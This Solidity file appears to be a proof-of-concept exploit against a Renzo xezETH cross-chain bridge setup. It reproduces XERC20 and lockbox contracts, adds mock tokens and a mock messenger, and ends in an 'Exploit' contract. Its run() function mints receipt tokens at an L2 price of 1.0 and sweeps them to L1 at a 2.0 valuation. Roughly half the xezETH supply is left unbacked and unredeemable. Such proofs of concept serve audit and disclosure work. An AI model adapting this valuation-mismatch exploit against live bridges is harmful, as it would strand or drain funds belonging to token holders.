    function setLimits(
        address _bridge,
        uint256 _mintingLimit,
        uint256 _burningLimit
    ) external onlyOwner {
        _changeMinterLimit(_bridge, _mintingLimit);
        _changeBurnerLimit(_bridge, _burningLimit);
        emit BridgeLimitsSet(_mintingLimit, _burningLimit, _bridge);
    }

    /**
     * @notice Returns the max limit of a bridge
     *
     * @param _bridge the bridge we are viewing the limits of
     * @return _limit The limit the bridge has
     */

    function mintingMaxLimitOf(address _bridge) public view returns (uint256 _limit) {
        _limit = bridges[_bridge].minterParams.maxLimit;
    }

    /**
     * @notice Returns the max limit of a bridge
     *
     * @param _bridge the bridge we are viewing the limits of
     * @return _limit The limit the bridge has
     */

    function burningMaxLimitOf(address _bridge) public view returns (uint256 _limit) {
        _limit = bridges[_bridge].burnerParams.maxLimit;
    }

    /**
     * @notice Returns the current limit of a bridge
     *
     * @param _bridge the bridge we are viewing the limits of
     * @return _limit The limit the bridge has
     */

    function mintingCurrentLimitOf(address _bridge) public view returns (uint256 _limit) {
        _limit = _getCurrentLimit(
            bridges[_bridge].minterParams.currentLimit,
            bridges[_bridge].minterParams.maxLimit,
            bridges[_bridge].minterParams.timestamp,
            bridges[_bridge].minterParams.ratePerSecond
        );
    }

    /**
     * @notice Returns the current limit of a bridge
     *
     * @param _bridge the bridge we are viewing the limits of
     * @return _limit The limit the bridge has
     */

    function burningCurrentLimitOf(address _bridge) public view returns (uint256 _limit) {
        _limit = _getCurrentLimit(
            bridges[_bridge].burnerParams.currentLimit,
            bridges[_bridge].burnerParams.maxLimit,
            bridges[_bridge].burnerParams.timestamp,
            bridges[_bridge].burnerParams.ratePerSecond
        );
    }

    /**
     * @notice Uses the limit of any bridge
     * @param _bridge The address of the bridge who is being changed
     * @param _change The change in the limit
     */

    function _useMinterLimits(address _bridge, uint256 _change) internal {
        uint256 _currentLimit = mintingCurrentLimitOf(_bridge);
        bridges[_bridge].minterParams.timestamp = block.timestamp;
        bridges[_bridge].minterParams.currentLimit = _currentLimit - _change;
    }

    /**
     * @notice Uses the limit of any bridge
     * @param _bridge The address of the bridge who is being changed
     * @param _change The change in the limit
     */

    function _useBurnerLimits(address _bridge, uint256 _change) internal {
        uint256 _currentLimit = burningCurrentLimitOf(_bridge);
        bridges[_bridge].burnerParams.timestamp = block.timestamp;
        bridges[_bridge].burnerParams.currentLimit = _currentLimit - _change;
    }

    /**
     * @notice Updates the limit of any bridge
     * @dev Can only be called by the owner
     * @param _bridge The address of the bridge we are setting the limit too
     * @param _limit The updated limit we are setting to the bridge
     */

    function _changeMinterLimit(address _bridge, uint256 _limit) internal {
        uint256 _oldLimit = bridges[_bridge].minterParams.maxLimit;
        uint256 _currentLimit = mintingCurrentLimitOf(_bridge);
        bridges[_bridge].minterParams.maxLimit = _limit;

        bridges[_bridge].minterParams.currentLimit = _calculateNewCurrentLimit(
            _limit,
            _oldLimit,
            _currentLimit
        );

        bridges[_bridge].minterParams.ratePerSecond = _limit / _DURATION;
        bridges[_bridge].minterParams.timestamp = block.timestamp;
    }

    /**
     * @notice Updates the limit of any bridge
     * @dev Can only be called by the owner
     * @param _bridge The address of the bridge we are setting the limit too
     * @param _limit The updated limit we are setting to the bridge
     */

    function _changeBurnerLimit(address _bridge, uint256 _limit) internal {
        uint256 _oldLimit = bridges[_bridge].burnerParams.maxLimit;
        uint256 _currentLimit = burningCurrentLimitOf(_bridge);
        bridges[_bridge].burnerParams.maxLimit = _limit;

        bridges[_bridge].burnerParams.currentLimit = _calculateNewCurrentLimit(
            _limit,
            _oldLimit,
            _currentLimit
        );

        bridges[_bridge].burnerParams.ratePerSecond = _limit / _DURATION;
        bridges[_bridge].burnerParams.timestamp = block.timestamp;
    }

    /**
     * @notice Updates the current limit
     *
     * @param _limit The new limit
     * @param _oldLimit The old limit
     * @param _currentLimit The current limit
     * @return _newCurrentLimit The new current limit
     */

    function _calculateNewCurrentLimit(
        uint256 _limit,
        uint256 _oldLimit,
        uint256 _currentLimit
    ) internal pure returns (uint256 _newCurrentLimit) {
        uint256 _difference;

        if (_oldLimit > _limit) {
            _difference = _oldLimit - _limit;
            _newCurrentLimit = _currentLimit > _difference ? _currentLimit - _difference : 0;
        } else {
            _difference = _limit - _oldLimit;
            _newCurrentLimit = _currentLimit + _difference;
        }
    }

    /**
     * @notice Gets the current limit
     *
     * @param _currentLimit The current limit
     * @param _maxLimit The max limit
     * @param _timestamp The timestamp of the last update
     * @param _ratePerSecond The rate per second
     * @return _limit The current limit
     */

    function _getCurrentLimit(
        uint256 _currentLimit,
        uint256 _maxLimit,
        uint256 _timestamp,
        uint256 _ratePerSecond
    ) internal view returns (uint256 _limit) {
        _limit = _currentLimit;
        if (_limit == _maxLimit) {
            return _limit;
        } else if (_timestamp + _DURATION <= block.timestamp) {
            _limit = _maxLimit;
        } else if (_timestamp + _DURATION > block.timestamp) {
            uint256 _timePassed = block.timestamp - _timestamp;
            uint256 _calculatedLimit = _limit + (_timePassed * _ratePerSecond);
            _limit = _calculatedLimit > _maxLimit ? _maxLimit : _calculatedLimit;
        }
    }

    /**
     * @notice Internal function for burning tokens
     *
     * @param _caller The caller address
     * @param _user The user address
     * @param _amount The amount to burn
     */

    function _burnWithCaller(address _caller, address _user, uint256 _amount) internal {
        // Do not allow 0 value burns
        if (_amount == 0) revert IXERC20_INVALID_0_VALUE();

        if (_caller != lockbox) {
            uint256 _currentLimit = burningCurrentLimitOf(_caller);
            if (_currentLimit < _amount) revert IXERC20_NotHighEnoughLimits();
            _useBurnerLimits(_caller, _amount);
        }
        _burn(_user, _amount);
    }

    /**
     * @notice Internal function for minting tokens
     *
     * @param _caller The caller address
     * @param _user The user address
     * @param _amount The amount to mint
     */

    function _mintWithCaller(address _caller, address _user, uint256 _amount) internal {
        // Do not allow 0 value mints
        if (_amount == 0) revert IXERC20_INVALID_0_VALUE();

        if (_caller != lockbox) {
            uint256 _currentLimit = mintingCurrentLimitOf(_caller);
            if (_currentLimit < _amount) revert IXERC20_NotHighEnoughLimits();
            _useMinterLimits(_caller, _amount);
        }
        _mint(_user, _amount);
    }
}

// ============================ REAL AUDITED SOURCE ============================
// contracts/Bridge/xERC20/contracts/XERC20Lockbox.sol (verbatim body)

contract XERC20Lockbox is Initializable, IXERC20Lockbox {
    using SafeERC20 for IERC20;
    using SafeCast for uint256;

    /**
     * @notice The XERC20 token of this contract
     */
    IXERC20 public XERC20;

    /**
     * @notice The ERC20 token of this contract
     */
    IERC20 public ERC20;

    /**
     * @notice Whether the ERC20 token is the native gas token of this chain
     */

    bool public IS_NATIVE;

    /// @dev Prevents implementation contract from being initialized.
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    /**
     * @notice Constructor
     *
     * @param _xerc20 The address of the XERC20 contract
     * @param _erc20 The address of the ERC20 contract
     * @param _isNative Whether the ERC20 token is the native gas token of this chain or not
     */
    function initialize(address _xerc20, address _erc20, bool _isNative) public initializer {
        XERC20 = IXERC20(_xerc20);
        ERC20 = IERC20(_erc20);
        IS_NATIVE = _isNative;
    }

    /**
     * @notice Deposit native tokens into the lockbox
     */

    function depositNative() public payable {
        if (!IS_NATIVE) revert IXERC20Lockbox_NotNative();

        _deposit(msg.sender, msg.value);
    }

    /**
     * @notice Deposit ERC20 tokens into the lockbox
     *
     * @param _amount The amount of tokens to deposit
     */

    function deposit(uint256 _amount) external {
        if (IS_NATIVE) revert IXERC20Lockbox_Native();

        _deposit(msg.sender, _amount);
    }

    /**
     * @notice Deposit ERC20 tokens into the lockbox, and send the XERC20 to a user
     *
     * @param _to The user to send the XERC20 to
     * @param _amount The amount of tokens to deposit
     */

    function depositTo(address _to, uint256 _amount) external {
        if (IS_NATIVE) revert IXERC20Lockbox_Native();

        _deposit(_to, _amount);
    }

    /**
     * @notice Deposit the native asset into the lockbox, and send the XERC20 to a user
     *
     * @param _to The user to send the XERC20 to
     */

    function depositNativeTo(address _to) public payable {
        if (!IS_NATIVE) revert IXERC20Lockbox_NotNative();

        _deposit(_to, msg.value);
    }

    /**
     * @notice Withdraw ERC20 tokens from the lockbox
     *
     * @param _amount The amount of tokens to withdraw
     */

    function withdraw(uint256 _amount) external {
        _withdraw(msg.sender, _amount);
    }

    /**
     * @notice Withdraw tokens from the lockbox
     *
     * @param _to The user to withdraw to
     * @param _amount The amount of tokens to withdraw
     */

    function withdrawTo(address _to, uint256 _amount) external {
        _withdraw(_to, _amount);
    }

    /**
     * @notice Withdraw tokens from the lockbox
     *
     * @param _to The user to withdraw to
     * @param _amount The amount of tokens to withdraw
     */

    function _withdraw(address _to, uint256 _amount) internal {
        emit Withdraw(_to, _amount);

        XERC20.burn(msg.sender, _amount);

        if (IS_NATIVE) {
            (bool _success, ) = payable(_to).call{ value: _amount }("");
            if (!_success) revert IXERC20Lockbox_WithdrawFailed();
        } else {
            ERC20.safeTransfer(_to, _amount);
        }
    }

    /**
     * @notice Deposit tokens into the lockbox
     *
     * @param _to The address to send the XERC20 to
     * @param _amount The amount of tokens to deposit
     */

    function _deposit(address _to, uint256 _amount) internal {
        if (!IS_NATIVE) {
            ERC20.safeTransferFrom(msg.sender, address(this), _amount);
        }

        XERC20.mint(_to, _amount);
        emit Deposit(_to, _amount);
    }

    /**
     * @notice Fallback function to deposit native tokens
     */
    receive() external payable {
        depositNative();
    }
}

// ==================== supporting contracts (opaque tokens) ====================

/// Plain 18-decimal ERC20 for opaque tokens (ezETH, nextWETH collateral, LINK).
contract MintableERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

/// Real WETH semantics (ETH-backed): deposit mints, withdraw burns + returns ETH.
contract WETH is ERC20 {
    constructor() ERC20("Wrapped Ether", "WETH") {}
    function deposit() public payable { _mint(msg.sender, msg.value); }
    function withdraw(uint256 wad) public {
        _burn(msg.sender, wad);
        (bool ok, ) = payable(msg.sender).call{value: wad}("");
        require(ok, "ETH send failed");
    }
    receive() external payable { _mint(msg.sender, msg.value); }
}

/// Thin harness around the REAL audited RenzoOracle.calculateMintAmount math.
/// The EigenLayer TVL plumbing that derives totalTVL is opaque restaking infra
/// and NOT part of this finding; the ezETH mint-rate formula (the L1 valuation
/// the bug hinges on) is preserved verbatim, so the L1 leg mints ezETH at the
/// REAL current-valuation rate.
contract RestakeManagerStub {
    uint256 internal constant SCALE_FACTOR = 10 ** 18;
    MintableERC20 public ezETH;
    uint256 public totalTVL;
    constructor(MintableERC20 _ezETH) { ezETH = _ezETH; }
    function seed(uint256 ethValue) external { totalTVL += ethValue; ezETH.mint(msg.sender, ethValue); }
    function accrueRewards(uint256 ethValue) external { totalTVL += ethValue; }
    function depositETH() external payable {
        uint256 ezETHToMint = _calculateMintAmount(totalTVL, msg.value, ezETH.totalSupply());
        totalTVL += msg.value;
        ezETH.mint(msg.sender, ezETHToMint);
    }
    // Verbatim from audited contracts/Oracle/RenzoOracle.sol:calculateMintAmount.
    function _calculateMintAmount(
        uint256 _currentValueInProtocol,
        uint256 _newValueAdded,
        uint256 _existingEzETHSupply
    ) internal pure returns (uint256) {
        if (_currentValueInProtocol == 0 || _existingEzETHSupply == 0) { return _newValueAdded; }
        uint256 inflationPercentaage = (SCALE_FACTOR * _newValueAdded) /
            (_currentValueInProtocol + _newValueAdded);
        uint256 newEzETHSupply = (_existingEzETHSupply * SCALE_FACTOR) /
            (SCALE_FACTOR - inflationPercentaage);
        uint256 mintAmount = newEzETHSupply - _existingEzETHSupply;
        require(mintAmount != 0, "InvalidTokenAmount");
        return mintAmount;
    }
}

/// The ONLY mocked component: the opaque cross-chain messenger (Connext). It
/// reproduces only the observable transport (L2 WETH->nextWETH swap, and xcall
/// delivering canonical wETH to the L1 target + invoking xReceive).
contract MockConnext {
    MintableERC20 public nextWETH;
    WETH public wethL1;
    constructor(MintableERC20 _nextWETH, WETH _wethL1) { nextWETH = _nextWETH; wethL1 = _wethL1; }
    function swapExact(
        bytes32, uint256 amountIn, address assetIn, address assetOut, uint256, uint256
    ) external payable returns (uint256) {
        IERC20(assetIn).transferFrom(msg.sender, address(this), amountIn);
        MintableERC20(assetOut).mint(msg.sender, amountIn);
        return amountIn;
    }
    function xcall(
        uint32 _destination, address _to, address _asset, address _delegate,
        uint256 _amount, uint256, bytes calldata _callData
    ) external payable returns (bytes32) {
        IERC20(_asset).transferFrom(msg.sender, address(this), _amount);
        wethL1.deposit{value: _amount}();
        wethL1.transfer(_to, _amount);
        IXReceiver(_to).xReceive(bytes32(0), _amount, address(wethL1), _delegate, _destination, _callData);
        return bytes32(0);
    }
    receive() external payable {}
}

/// Minimal delegatecall proxy so the real Initializable contracts can be initialized.
contract DelegateProxy {
    address public immutable implementation;
    constructor(address implementation_) { implementation = implementation_; }
    fallback() external payable {
        address target = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), target, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
    receive() external payable {}
}

// ================================= EXPLOIT ==================================

contract Exploit {
    XERC20 public xezETH;
    MintableERC20 public ezETH;
    WETH public wethL2;
    WETH public wethL1;
    MintableERC20 public nextWETH;
    MintableERC20 public linkToken;
    RestakeManagerStub public restakeManager;
    XERC20Lockbox public lockbox;
    xRenzoDeposit public deposit_;
    xRenzoBridge public bridge;
    MockConnext public connext;

    function depositAddr() external view returns (address) { return address(deposit_); }
    function bridgeAddr() external view returns (address) { return address(bridge); }
    function xezETHAddr() external view returns (address) { return address(xezETH); }
    function lockboxAddr() external view returns (address) { return address(lockbox); }

    function _proxy(address impl) internal returns (address) { return address(new DelegateProxy(impl)); }

    // The four large audited contracts are deployed as helper contracts (each its
    // own transaction, to stay under the EIP-3860 init-code limit) and their
    // implementation addresses are handed to this constructor; the Exploit only
    // deploys lightweight proxies + tokens and does the wiring.
    constructor(address depositImpl, address bridgeImpl, address xercImpl, address lockboxImpl) payable {
        // receipt token (real XERC20)
        xezETH = XERC20(_proxy(xercImpl));
        xezETH.initialize("xezETH", "xezETH", address(this));

        // opaque tokens
        ezETH = new MintableERC20("ezETH", "ezETH");
        wethL2 = new WETH();
        wethL1 = new WETH();
        nextWETH = new MintableERC20("nextWETH", "nextWETH");
        linkToken = new MintableERC20("LINK", "LINK");

        // L1 restake manager (REAL mint-rate math); price 1.0 -> 2.0
        restakeManager = new RestakeManagerStub(ezETH);
        restakeManager.seed(100 ether);
        restakeManager.accrueRewards(100 ether);

        // L1 lockbox (real)
        lockbox = XERC20Lockbox(payable(_proxy(lockboxImpl)));
        lockbox.initialize(address(xezETH), address(ezETH), false);
        xezETH.setLockbox(address(lockbox));

        // messenger mock
        connext = new MockConnext(nextWETH, wethL1);

        // L1 bridge (real)
        bridge = xRenzoBridge(payable(_proxy(bridgeImpl)));
        bridge.initialize(
            IERC20(address(ezETH)),
            IERC20(address(xezETH)),
            IRestakeManager(address(restakeManager)),
            IERC20(address(wethL1)),
            IXERC20Lockbox(address(lockbox)),
            IConnext(address(connext)),
            IRouterClient(address(0xC1)),
            IRateProvider(address(0xC2)),
            LinkTokenInterface(address(linkToken)),
            IRoleManager(address(0xC3))
        );

        // L2 deposit (real); L2 valuation stays 1.0
        deposit_ = xRenzoDeposit(payable(_proxy(depositImpl)));
        deposit_.initialize(
            1e18,
            IERC20(address(xezETH)),
            IERC20(address(wethL2)),
            IERC20(address(nextWETH)),
            IConnext(address(connext)),
            bytes32("swap"),
            address(0xD1),
            1,
            address(bridge),
            IRenzoOracleL2(address(0))
        );

        // XERC20 bridge limits + sweeper
        xezETH.setLimits(address(deposit_), 1e27, 1e27);
        xezETH.setLimits(address(bridge), 1e27, 1e27);
        deposit_.setAllowedBridgeSweeper(address(this), true);
    }

    function run() external payable {
        // Fund the messenger so it can back the wETH it delivers to L1.
        (bool ok, ) = payable(address(connext)).call{value: 1 ether}("");
        require(ok, "fund connext");

        // STEP 1 (L2): deposit 1 ETH of WETH -> mint xezETH at L2 valuation 1.0.
        wethL2.deposit{value: 1 ether}();
        wethL2.approve(address(deposit_), type(uint256).max);
        uint256 minted = deposit_.deposit(1 ether, 0, type(uint256).max);

        // STEP 2 (L1): sweep -> xcall -> xReceive mints ezETH at valuation 2.0,
        // locks it in the lockbox, mints matching xezETH and burns it.
        deposit_.sweep();

        // HARM: only ~half the receipt supply is backed. Redeem the backed part;
        // the remainder is permanently unbacked / unredeemable xezETH.
        uint256 backing = ezETH.balanceOf(address(lockbox));
        xezETH.approve(address(lockbox), type(uint256).max);
        lockbox.withdraw(backing);

        uint256 stranded = xezETH.balanceOf(address(this));
        require(stranded == minted - backing, "stranded mismatch");
        require(stranded > 0, "no harm");
    }

    receive() external payable {}
}
